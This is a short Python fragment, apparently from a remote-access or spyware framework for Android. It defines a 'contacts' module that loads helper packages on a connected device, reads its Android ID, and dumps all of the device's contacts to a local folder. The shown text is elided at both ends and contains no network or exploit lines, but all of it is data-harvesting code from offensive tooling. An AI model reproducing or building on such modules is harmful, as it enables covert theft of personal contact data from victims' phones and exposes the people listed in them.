...
class contacts(GhostModule):
    """ to get contacts """

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = GhostArgumentParser(prog='contacts', description=cls.__doc__)
    ...
    def run(self, args):
        self.client.load_package("ghostdroid.contacts")
        self.client.load_package("ghostdroid.utils")
        path = getLocalAndroidPath(localFolder=args.localOutputFolder, androidID=self.client.conn.modules['ghostdroid.utils'].getAndroidID(), userName=self.client.desc['user'])
        if args.get_all:
            self.success("Getting contacts...")
            contacts = self.client.conn.modules['ghostdroid.contacts'].getAllContacts()
